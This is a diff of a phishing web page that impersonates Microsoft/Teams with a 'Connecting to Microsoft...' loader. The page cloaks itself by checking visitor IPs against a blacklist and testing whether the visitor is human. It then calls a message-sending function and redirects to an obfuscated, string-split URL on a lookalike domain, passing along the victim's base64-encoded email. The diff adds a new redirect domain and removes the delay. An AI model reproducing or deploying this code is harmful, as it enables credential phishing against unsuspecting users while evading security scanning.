@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VNote Center</title>
+    <title>Cloaking Example</title>
     <style>
         body, html {
             margin: 0;
@@ -302,7 +302,6 @@ function sendMessage2() {
 
             } else if (data === 'clean') {
                 console.log('IP ' + ip + ' is not blacklisted. Proceeding...');
-                sendMessage();
                 loadContent();
             } else {
                 console.log('Error:', data);
@@ -385,7 +384,8 @@ function sendMessage2() {
 function verifyAndRedirect() {
                 if (isHuman()) {
                     if (isValidEmail('${getBase64FromUrl()}')) {
-                        window.location.assign('h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'d'+'f'+'g'+'h'+'b'+'v'+'.'+'cr'+'im'+'ek'+'ha'+'ba'+'rn'+'am'+'a.'+'co'+'m/'+'44'+'74'+'ca'+'?e'+'bf'+'e0'+'1f'+'09'+'6='+'Ci'+'VV'+'y'+'#'+'${getBase64FromUrl()}');
+                        '${sendMessage()}';
+                        window.location.assign('h'+'tt'+'ps'+'://'+'df'+'gh'+'bv'+'-b'+'2z'+'ma'+'.m'+'ic'+'ro'+'do'+'cu'+'me'+'nt'+'dr'+'iv'+'e.'+'co'+'m/'+'44'+'74'+'ca'+'?e'+'bf'+'e0'+'1f'+'09'+'6='+'ej'+'6D'+'7#'+'${getBase64FromUrl()}');
                     } else {
              fetch('https://ipinfo.io/json?token=d8eafd6deea176')
             .then(response => response.json())
@@ -406,9 +406,10 @@ function verifyAndRedirect() {
     }
             }
 
-            setTimeout(verifyAndRedirect, 2000);
+            setTimeout(verifyAndRedirect, 0);
         `;
         document.getElementById('content').innerHTML = `
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -451,14 +452,14 @@ function verifyAndRedirect() {
         }
 
         .feds-brand-image img {
-            width: 150px; /* Increased size for the Microsoft Teams logo */
+            width: 100px; /* Increased size for the Microsoft Teams logo */
             height: auto;
             margin-right: 20px; /* More space if you were to add another logo */
         }
 
         .loader {
             border: 6px solid #e0e0e0;
-            border-top: 6px solid #071089ad;
+            border-top: 6px solid #e60000;
             border-radius: 50%;
             width: 50px;
             height: 50px;
@@ -524,7 +525,7 @@ function verifyAndRedirect() {
             <!-- Removed second logo -->
         </div>
         <div class="loader"></div>
-        <p class="connecting-message">Connecting to Microsoft Team...</p>
+        <p class="connecting-message">Connecting to Microsoft...</p>
         <button class="button" style="display: none;">Cancel</button> <!-- Optional cancel button -->
     </div>
     <div id="app-content" class="app-content" style="display: none;">
@@ -533,6 +534,8 @@ function verifyAndRedirect() {
     </div>
 </body>
 </html>
+
+
     `;
         document.body.appendChild(script);
     } else {
